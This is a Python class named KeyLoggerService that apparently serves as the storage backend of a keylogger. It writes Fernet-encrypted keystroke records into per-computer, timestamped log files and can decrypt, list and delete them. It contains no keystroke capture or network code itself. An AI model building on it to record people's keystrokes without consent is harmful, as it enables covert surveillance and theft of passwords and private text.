import os
import json
import threading
import datetime
from cryptography.fernet import Fernet
import glob

class KeyLoggerService:
    def __init__(self, logs_dir="logs", key_file="secret.key"):
        self.logs_dir = logs_dir
        self.key_file = key_file
        if not os.path.exists(self.logs_dir):
            os.makedirs(self.logs_dir)

        if not os.path.exists(self.key_file):
            key = Fernet.generate_key()
            with open(self.key_file, "wb") as f:
                f.write(key)
        else:
            with open(self.key_file, "rb") as f:
                key = f.read()

        self.cipher = Fernet(key)
        self.log_path_template = os.path.join(self.logs_dir, "{}_{}.log")

    def _get_log_path(self, comp_id):
        return self.log_path_template.format(comp_id, datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))

    def log_key(self, comp_id, key, timestamp=None):
        if timestamp:
            entry_timestamp = datetime.datetime.fromtimestamp(timestamp).isoformat()
        else:
            entry_timestamp = datetime.datetime.now().isoformat()
        
        entry = {"key": key, "timestamp": entry_timestamp}
        data = json.dumps(entry).encode()
        encrypted = self.cipher.encrypt(data)
        
        log_path = self._get_log_path(comp_id)
        with open(log_path, "ab") as f:
            f.write(encrypted + b"\n")

    def get_keys(self, comp_id):
        all_entries = []
        log_files = glob.glob(os.path.join(self.logs_dir, f"{comp_id}_*.log"))
        log_files.sort()

        for log_file in log_files:
            try:
                with open(log_file, "rb") as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            decrypted = self.cipher.decrypt(line)
                            entry = json.loads(decrypted)
                            all_entries.append(entry)
                        except:
                            continue
            except FileNotFoundError:
                continue
        return all_entries

    def delete_keys(self, comp_id):
        for fname in os.listdir(self.logs_dir):
            if fname.startswith(comp_id + "_"):
                os.remove(os.path.join(self.logs_dir, fname))

    def load_existing_logs(self):
        # This method is no longer needed
        pass